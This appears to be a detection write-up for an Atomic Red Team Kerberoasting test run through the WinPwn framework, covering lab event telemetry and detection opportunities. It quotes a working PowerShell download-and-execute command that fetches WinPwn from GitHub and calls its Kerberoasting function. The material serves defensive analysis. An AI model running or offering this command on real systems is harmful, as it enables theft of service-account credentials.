# T1558.003-6: Kerberoasting — WinPwn Kerberoasting

## Technique Context

Kerberoasting (T1558.003) exploits the Kerberos protocol to let any domain-authenticated user request TGS tickets for service accounts with SPNs, then crack those tickets offline. This test uses WinPwn, a PowerShell-based post-exploitation framework maintained by S3cur3Th1sSh1t on GitHub. WinPwn provides a menu-driven collection of offensive techniques wrapped around well-known PowerShell attack modules. The `Kerberoasting` function within WinPwn downloads and invokes Invoke-Kerberoast (from the Empire project) internally — making this test functionally similar to T1558.003-1 but accessed through WinPwn's framework layer.

## What This Dataset Contains

The dataset spans approximately 10 seconds on 2026-03-17 from ACME-WS06 (acme.local domain) and contains 171 events across Application, PowerShell, Security, and Sysmon channels.

**The attack command**, captured in Security EID 4688 and Sysmon EID 1:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive}
```

Sysmon EID 1 tags this process `technique_id=T1059.001,technique_name=PowerShell`.

**Process chain** (Security EID 4688): `whoami.exe` pre-check, then the attacking `powershell.exe` with the WinPwn download-and-invoke command, then a second `whoami.exe`, then a cleanup `powershell.exe & {}`. Four EID 4688 events total.

**Sysmon events include:**
- EID 7 (Image Load): 25 events — .NET CLR DLLs into PowerShell, tagged `T1055/Process Injection`, `T1059.001/PowerShell`, and `T1574.002/DLL Side-Loading`
- EID 10 (Process Access): 4 events — PowerShell opening child processes with full access `0x1fffff`, tagged `T1055.001/Dynamic-link Library Injection`
- EID 11 (File Create): PowerShell writing `StartupProfileData-NonInteractive` to the SYSTEM profile PowerShell directory
- EID 17 (Pipe Create): Two `\PSHost.*` named pipes for two PowerShell instantiations
- EID 3 (Network Connect): 1 network connection — the download of WinPwn.ps1 from GitHub
- EID 22 (DNS Query): 1 DNS query — expected to resolve `raw.githubusercontent.com` for the WinPwn download

**PowerShell channel** (125 events): 120 EID 4104 script block records, 4 EID 4103 pipeline execution records, and 1 EID 4100. The 4103 records show `Set-ExecutionPolicy Bypass` and `Write-Host "DONE"`. The EID 4100 is a pipeline error record from the test framework, not an AMSI block. The WinPwn framework's complete source code would appear across the 120 EID 4104 blocks, though only boilerplate fragments appear in the sample set.

**Application channel**: One EID 15 Security Center report.

## What This Dataset Does Not Contain

No Kerberos ticket request events (EID 4769) are present on the workstation. WinPwn's `Kerberoasting -noninteractive` function wraps Invoke-Kerberoast, which requires SPN-bearing service accounts in the domain. As with the other Kerberoasting tests in this environment, the attack ran to completion but produced no ticket harvests because the domain lacks qualifying target accounts. The Security channel contains only EID 4688 process creation events.

The WinPwn module code itself does not appear in the sample set but is present across the full 120 EID 4104 records in the dataset. The `-consoleoutput -noninteractive` flags are WinPwn-specific parameters for non-interactive execution, which is how ART invokes it.

## Assessment

This dataset is the WinPwn-wrapped version of the Empire Invoke-Kerberoast attack. The key forensic difference from T1558.003-1 is the download source and framework layer: the outer URL is the WinPwn framework (`WinPwn.ps1` from `S3cur3Th1sSh1t/WinPwn`), and WinPwn in turn loads additional modules. This produces a longer download chain and more script block logging, explaining the slightly higher event count (171 versus 162 events in T1558.003-1).

The network telemetry is identical in structure to T1558.003-1: one DNS query and one network connection to GitHub for the download. The Sysmon EID 7 pattern is also identical — the same .NET CLR assemblies load regardless of whether WinPwn or raw Invoke-Kerberoast is the download target.

Compared with the defended variant (datasets/art/T1558.003-6, Sysmon: 41, Security: 10, PowerShell: 51), the total event count is higher in the undefended run (171 versus 102). In the defended run, AMSI would have blocked the WinPwn script download; here the download completes and the framework initializes fully.

## Detection Opportunities Present in This Data

**Command-line content** in Security EID 4688 and Sysmon EID 1: The `iex(new-object net.webclient).downloadstring(...)` pattern is a well-known download-execute idiom. The specific URL contains the WinPwn repository path and the `Kerberoasting` function call with `-noninteractive` is immediately recognizable.

**DNS and network telemetry**: Sysmon EID 22 documents the DNS resolution and EID 3 documents the connection to GitHub. A SYSTEM-context PowerShell process making outbound downloads to raw.githubusercontent.com is anomalous in a managed enterprise environment.

**PowerShell script block logging (EID 4104)**: The WinPwn framework source code, the `Kerberoasting` function invocation, and the underlying Invoke-Kerberoast logic are all captured across the 120 EID 4104 blocks in the full dataset.

**URL-based indicators**: The exact commit hash in the WinPwn URL (`121dcee26a7aca368821563cbe92b2b5638c5773`) and the S3cur3Th1sSh1t GitHub path are specific enough to use as network-layer indicators. ART uses pinned commit hashes for reproducibility, but live attackers frequently use the same public repositories.

**Process lineage and SYSTEM context**: A SYSTEM-context `powershell.exe` downloading from GitHub and invoking a function called `Kerberoasting` is a direct attack indicator regardless of the framework wrapping it.
